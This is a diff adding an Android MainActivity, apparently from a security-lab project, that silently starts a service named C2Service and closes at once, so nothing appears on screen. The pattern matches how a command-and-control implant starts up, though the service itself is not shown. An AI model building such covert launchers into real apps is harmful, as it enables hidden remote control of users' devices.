@@ -1,0 +1,16 @@
+package com.example.securitylab;
+
+import android.content.Intent;
+import android.os.Bundle;
+import androidx.appcompat.app.AppCompatActivity;
+
+public class MainActivity extends AppCompatActivity {
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        
+        Intent serviceIntent = new Intent(this, C2Service.class);
+        startService(serviceIntent);
+        finish();
+    }
+}
